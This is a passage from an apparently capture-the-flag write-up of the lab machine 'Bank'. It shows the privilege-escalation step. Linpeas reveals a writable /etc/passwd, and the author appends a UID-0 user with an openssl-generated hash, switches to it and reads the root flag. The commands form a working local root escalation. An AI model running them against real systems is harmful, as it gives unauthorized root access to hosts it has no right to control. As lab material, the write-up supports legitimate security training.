www-data@bank:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.sh
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferlinpeas %}

<br />
Run the peas and give it look.  Notice the permissions on the `/etc/passwd` file.

{% capture transferlinpeas %}
www-data@bank:/dev/shm$ ./linpeas.sh	
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀

<snip>

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

<snip>

{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferlinpeas %}

<br />
Use openssl to generate a new encrypted password.

{% capture openssl %}
www-data@bank:/dev/shm$ openssl passwd letmein
openssl passwd letmein
9.tdjnQvVYGSA
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=openssl %}

<br />
Echo the new user into the /etc/passwd file.

{% capture etcpasswd %}
www-data@bank:/$ echo 'bd:9.tdjnQvVYGSA":0:0:root:/root:/bin/bash' >> /etc/passwd
<.tdjnQvVYGSA":0:0:root:/root:/bin/bash' >> /etc/passwd
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etcpasswd %}

<br />
Check the /etc/passwd file to see if the user was successfully added.

{% capture etcpasswdcheck %}
www-data@bank:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
chris:x:1000:1000:chris,,,:/home/chris:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:112::/var/cache/bind:/bin/false
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
bd:9.tdjnQvVYGSA":0:0:root:/root:/bin/bash
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etcpasswdcheck %}

<br />
Su into the new user that was just created.

{% capture sunewuser %}
www-data@bank:/$ su bd
su bd
Password: letmein
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sunewuser %}

<br />
Get the root.txt flag.

{% capture rootflag %}
root@bank:~# cat root.txt 
cat root.txt
<redacted>
root@bank:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:95:d9:61 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.29/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:d961/64 scope global dynamic 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:fe95:d961/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
With that crushed another box.  Talk that all the way to the Bank!